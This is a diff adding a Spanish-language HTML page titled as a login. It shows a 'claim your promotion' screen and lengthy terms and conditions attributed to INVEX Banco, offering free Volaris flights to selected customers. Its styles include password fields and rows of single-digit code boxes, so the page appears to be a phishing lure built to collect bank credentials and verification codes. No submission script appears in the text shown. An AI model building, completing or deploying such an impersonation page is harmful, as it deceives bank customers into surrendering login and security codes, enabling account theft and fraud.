@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Inicio de Sesión</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 400px;
+      margin: 20px auto;
+      text-align: center;
+    }
+    input[type="text"],
+    input[type="password"],
+    input[type="number"] {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    #codeInputs1,
+    #codeInputs2 {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .code-input {
+      width: 50px;
+      height: 50px;
+      text-align: center;
+      font-size: 24px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .code-input:focus {
+      border-color: #aa1e3b;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #a71138;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 18px;
+      transition: background 0.3s;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #e04343;
+    }
+    .loading {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 24px;
+      color: #333;
+      display: none;
+      z-index: 9999;
+    }
+    .error-message {
+      color: #a71138;
+      display: none;
+    }
+    @media (max-width: 480px) {
+      .container {
+        width: 95%;
+        padding: 15px;
+      }
+      .code-input {
+        width: 40px;
+        height: 40px;
+        font-size: 22px;
+      }
+      button {
+        font-size: 16px;
+        padding: 12px;
+      }
+    }
+    .terms-container-content {
+      max-height: 300px;
+      overflow-y: scroll;
+      text-align: left;
+      margin-bottom: 20px;
+      padding-right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="loading" id="loading">Cargando...</div>
+
+  <!-- 1. Pantalla de Reclama tu Promoción -->
+  <div class="container" id="claimPromotionContainer">
+    <h2>¡Reclama tu promoción!</h2>
+    <p>Haz clic en el botón de abajo para acceder a los términos y condiciones de la promoción.</p>
+    <button id="claimPromotionBtn">Ver Términos y Condiciones</button>
+  </div>
+
+  <!-- 2. Pantalla de Términos y Condiciones -->
+  <div class="container" id="termsContainer" style="display: none;">
+    <h2>Términos y Condiciones de la Promoción B2 Vuelos Gratis a Clientes Seleccionados INVEX</h2>
+    <div class="terms-container-content">
+      <p>
+        Los presentes Términos y Condiciones (en adelante, los “Términos y Condiciones”) tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada “B2 Vuelos Gratis a Clientes Seleccionados INVEX” ofrecida por BANCO INVEX, S.A., INSTITUCIÓN DE BANCA MÚLTIPLE INVEX GRUPO FINANCIERO e INVEX CONSUMO, S.A. DE C.V. SOFOM, ENTIDAD REGULADA, INVEX GRUPO FINANCIERO (en lo sucesivo “INVEX Banco”).
+      </p>
+      <p>
+        1. <strong>Requisitos para Participar:</strong> La promoción está dirigida exclusivamente a clientes seleccionados de INVEX Banco, quienes deberán cumplir con los siguientes requisitos:
+      </p>
+      <ul>
+        <li>a. Ser titular de una tarjeta de crédito INVEX válida y activa.</li>
+        <li>b. Cumplir con las condiciones de elegibilidad que INVEX Banco determine, según el perfil del cliente.</li>
+        <li>c. Ser notificado de su selección para participar en la promoción a través de los canales oficiales de INVEX Banco.</li>
+      </ul>
+      <p>
+        2. <strong>Descripción de la Promoción:</strong> Los clientes seleccionados recibirán el beneficio de un vuelo gratuito a tarifa aérea 0, cubriendo solo los cargos por TUA (Tarifa de Uso de Aeropuerto), bajo las condiciones que INVEX Banco determine. La promoción solo aplica para vuelos con la aerolínea VOLARIS y se encuentra sujeta a disponibilidad de fechas y destinos establecidos por INVEX Banco.
+      </p>
+      <p>3. <strong>Condiciones Generales:</strong></p>
+      <ul>
+        <li>a. El vuelo gratuito solo incluye la tarifa aérea 0 (cero), los cuales no son canjeables por dinero ni transferibles.</li>
+        <li>b. El cliente deberá asumir el costo del TUA, así como cualquier otro cargo adicional asociado al vuelo, como impuestos, servicios o gastos extras.</li>
+        <li>c. El beneficio es válido solo para vuelos nacionales e internacionales según lo determine INVEX Banco y VOLARIS, sujeto a disponibilidad y restricciones de la aerolínea.</li>
+      </ul>
+      <p>
+        4. <strong>Proceso de Obtención del Beneficio:</strong> Una vez que el cliente haya sido seleccionado para participar en la promoción, se enviará un correo electrónico o mensaje al cliente con un enlace único para la contratación del vuelo gratuito. El cliente deberá seguir las instrucciones detalladas en dicho enlace para completar su reserva.
+      </p>
+      <p>5. <strong>Limitaciones y Exclusiones:</strong></p>
+      <ul>
+        <li>a. La promoción está sujeta a disponibilidad de vuelos y restricciones de fechas establecidas por INVEX Banco y VOLARIS.</li>
+        <li>b. El beneficio no es acumulable con otras promociones o descuentos.</li>
+        <li>c. Solo se podrá obtener un vuelo gratuito por cliente seleccionado.</li>
+      </ul>
+      <p>
+        6. <strong>Modificaciones y Cancelación:</strong> INVEX Banco se reserva el derecho de modificar, suspender o cancelar esta promoción en cualquier momento, sin necesidad de previo aviso, así como de modificar los términos y condiciones sin responsabilidad alguna.
+      </p>
+      <p>
+        7. <strong>Aceptación de los Términos:</strong> Al participar en esta promoción, los clientes aceptan expresamente estos Términos y Condiciones.
+      </p>
+      <p>
+        8. <strong>Uso de Datos Personales:</strong> Al participar en esta promoción, el cliente acepta que los datos personales proporcionados durante el proceso de inscripción, así como cualquier otra información relacionada con la promoción, puedan ser recopilados y utilizados por INVEX Banco y terceros autorizados para fines relacionados con la promoción, así como para otros fines comerciales, de marketing y publicidad.
+      </p>
+      <p>
+        9. <strong>Jurisdicción:</strong> Este beneficio está regido por las leyes de México y cualquier controversia derivada de la interpretación o ejecución de los presentes Términos y Condiciones será resuelta ante los tribunales competentes de México.
+      </p>
+    </div>
+    <button id="acceptTermsBtn">Aceptar Términos</button>
+  </div>
